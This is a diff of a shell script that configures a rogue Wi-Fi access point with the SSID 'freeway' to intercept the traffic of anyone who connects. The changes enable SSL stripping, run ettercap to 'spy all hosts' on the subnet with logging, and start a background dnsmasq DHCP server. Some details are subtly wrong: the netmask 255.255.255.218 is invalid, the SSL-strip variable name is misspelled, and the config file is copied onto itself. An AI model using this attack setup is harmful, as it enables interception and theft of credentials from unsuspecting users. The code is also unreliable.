@@ -9,7 +9,7 @@ ROGUE_AP_INTERFACE="wlan0"
 ROGUE_AP_CHANNEL=5
 ROGUE_AP_SSID="freeway"
 DHCPD_CONF_FILE="/etc/dnsmasq.conf"
-USE_SSLTRIP="no"
+USE_SSLTRIP="yes"
 USE_ETTERCAP="yes"
 USE_SERGIO="no" # Note: incompatible with USE_SSLSTRIP (also launches its own SSL strip tool)
  
@@ -21,7 +21,7 @@ if [ "$1" == "stop" ];then
 	sleep 3;
 	echo "Killing DHCP..."
 	pkill dnsmasq
-	rm /var/run/dnsmasq.pid
+	rm /run/dhcpd.pid
 	sleep 3;
 	echo "Flushing iptables"
 	iptables --flush
@@ -65,7 +65,7 @@ then
 	sleep 5;
  
 	echo "configuring interface at0 according to dhcpd config"
-	ifconfig at0 up
+#	ifconfig at0 up
 	ifconfig at0 192.168.2.129 netmask 255.255.255.218
 	echo "adding a route"
 	route add -net 192.168.2.128 netmask 255.255.255.128 gw 192.168.2.129
@@ -86,16 +86,16 @@ then
 	echo "clearing lease table"
 	echo > '/var/lib/misc/dnsmasq.leases'
  
-	cp ./dnsmasq.conf $DHCPD_CONF_FILE
+	cp /etc/dnsmasq.conf $DHCPD_CONF_FILE
 	echo "starting new DHCPD server"
-	#ln -s /run/dhcpd.pid /var/run/dhcpd.pid
+        ln -s /run/dhcpd.pid /var/run/dhcpd.pid
  
-	dnsmasq -C "$DHCPD_CONF_FILE" -d
+	dnsmasq -C "$DHCPD_CONF_FILE" -d &
 	sleep 5;
 	if [ "$USE_ETTERCAP" == "yes" ]
 	then
 		echo "Launching ettercap, spy all hosts on the at0 interface's subnet"
-		xterm -bg black -fg blue -e ettercap --silent -T -q -p --log-msg ${LOGS_PATH}/ettercap.log -i at0 // // &
+		xterm -bg black -fg blue -e ettercap --silent -T -q -p --log-msg ${LOGS_PATH}/ettercap.log -i at0 &
 		sleep 8
 	fi
  
